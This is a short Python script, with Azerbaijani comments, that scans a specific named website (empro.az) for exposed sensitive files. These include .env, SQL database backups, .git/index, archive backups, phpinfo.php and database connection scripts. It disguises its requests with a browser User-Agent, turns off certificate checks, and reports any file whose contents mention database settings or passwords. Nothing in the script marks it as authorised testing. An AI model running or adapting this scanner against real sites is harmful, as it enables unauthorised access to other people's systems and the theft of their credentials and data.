import asyncio
import httpx

TARGET = "https://empro.az"
# Daha ağır və kritik sızma nöqtələri
CRITICAL_PATHS = [
    "/admin.php", "/db_backup.sql", "/.env", "/v1/api", "/api/users", 
    "/backup.tar.gz", "/old_website.zip", "/test.php", "/phpinfo.php",
    "/.git/index", "/settings.py", "/database.php", "/db.php", "/connect.php"
]

async def intruder(path, client):
    url = f"{TARGET}{path}"
    try:
        # Brauzer kimi görünmək üçün xüsusi header
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36"}
        resp = await client.get(url, headers=headers, timeout=10)
        
        if resp.status_code == 200:
            # Əgər faylın içində şifrə və ya DB məlumatı olsa
            print(f"🚩 [FATAL] KRİTİK FAYL TAPILDI: {url}")
            if "DB_" in resp.text or "PASSWORD" in resp.text:
                 print(f"   🔥 [CRITICAL] Faylın içində şifrələr aşkarlandı!")
        elif resp.status_code == 403:
             print(f"⚠️  [LOCKED] Gizli qovluq var amma kilidlidir: {url}")
    except:
        pass

async def main():
    print(f"🕵️  DEEP-RECON BAŞLADI: {TARGET}")
    async with httpx.AsyncClient(verify=False, http2=True) as client:
        tasks = [intruder(p, client) for p in CRITICAL_PATHS]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
